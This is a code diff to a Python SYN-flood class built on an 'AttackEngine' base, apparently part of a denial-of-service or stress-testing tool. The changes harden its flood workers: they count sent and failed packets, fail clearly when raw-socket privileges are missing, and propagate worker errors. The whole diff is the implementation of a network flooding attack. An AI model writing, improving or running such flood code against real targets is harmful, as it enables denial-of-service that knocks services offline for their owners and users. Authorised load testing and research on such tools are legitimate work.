@@ -13,6 +13,7 @@ class SynFlood(AttackEngine):
 
     def __init__(self, cfg: Config) -> None:
         super().__init__(cfg.effective_rps(), cfg.workers, cfg.duration_sec)
+        self.stats["acked"] = 0
         self.target_rps = cfg.effective_rps()
         self.syn = cfg.syn or SynPayload()
         host, _, port_s = cfg.target.partition(":")
@@ -53,9 +54,16 @@ class SynFlood(AttackEngine):
         async def worker() -> None:
             while not self.stop_event.is_set():
                 await self.bucket.acquire(per_worker)
-                await loop.run_in_executor(None, burst, per_worker)
-                self.stats["sent"] += per_worker
-                self.stats["ok"] += per_worker  # fire-and-forget; no ACK tracking in MVP
+                try:
+                    await loop.run_in_executor(None, burst, per_worker)
+                    self.stats["sent"] += per_worker
+                except PermissionError as exc:
+                    raise RuntimeError(
+                        "SYN flood requires root or CAP_NET_RAW permission"
+                    ) from exc
+                except OSError:
+                    self.stats["err"] += per_worker
+                    self.stats["sent"] += per_worker
 
         workers = [asyncio.create_task(worker()) for _ in range(worker_count)]
         try:
@@ -64,4 +72,7 @@ class SynFlood(AttackEngine):
             pass
         for w in workers:
             w.cancel()
-        await asyncio.gather(*workers, return_exceptions=True)
+        results = await asyncio.gather(*workers, return_exceptions=True)
+        for result in results:
+            if isinstance(result, RuntimeError):
+                raise result
